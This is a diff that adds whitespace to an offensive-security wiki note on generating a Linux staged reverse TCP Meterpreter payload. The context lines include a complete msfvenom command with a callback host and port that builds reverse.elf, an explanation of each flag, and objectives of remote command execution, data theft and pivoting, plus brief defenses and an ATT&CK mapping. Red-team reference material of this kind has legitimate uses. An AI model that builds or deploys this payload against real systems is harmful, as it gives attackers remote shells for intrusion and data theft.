@@ -38,11 +38,15 @@ Technical Explanation: The Linux Staged Reverse TCP Meterpreter Shell is a paylo
 
 Business Value: This procedure can be used by an attacker to gain remote access to a compromised Linux system, allowing them to steal sensitive data, install malware, or use the compromised system as a pivot point to attack other systems on the network.
 
+ 
+
 ## Requirements
 
 1. Access to a vulnerable Linux system
 
 1. Knowledge of the target system's network configuration
+
+ 
 
 ## Defense
 
@@ -52,17 +56,27 @@ Business Value: This procedure can be used by an attacker to gain remote access 
 
 1. Implement strong access controls to prevent unauthorized access to critical systems
 
+ 
+
 ## Objectives
 
 1. Gain remote access to a compromised Linux system
 
 1. Execute commands on the compromised system
 
+ 
+
 # Instructions
 
 1. Use the msfvenom tool to generate a Linux x86 Meterpreter payload that will connect back to the specified IP address and port. The payload will be saved as a ELF file named 'reverse.elf'.
 
+ 
+
+
+
 **Code**: [[msfvenom -p linux/x86/meterpreter/reverse_tcp LHOS]]
+
+
 
 > -p: Specify the payload to use
 linux/x86/meterpreter/reverse_tcp: The payload to use - a reverse TCP Meterpreter shell for Linux x86 systems
@@ -72,11 +86,15 @@ LPORT: The port of the listener
 elf: The ELF format for Linux executables
 >reverse.elf: Redirect the output of the payload to a file named 'reverse.elf'
 
+
+
 **Command** ([[Generate Linux reverse meterpreter payload]]):
 
 ```bash
 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f elf >reverse.elf
 ```
+
+
 
 ## MITRE ATT&CK Mapping
 
@@ -101,3 +119,5 @@ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f elf >
 - [[Linux Staged reverse TCP]]
 - [[Meterpreter Shell]]
 - [[Reverse Shell Cheat Sheet]]
+
+
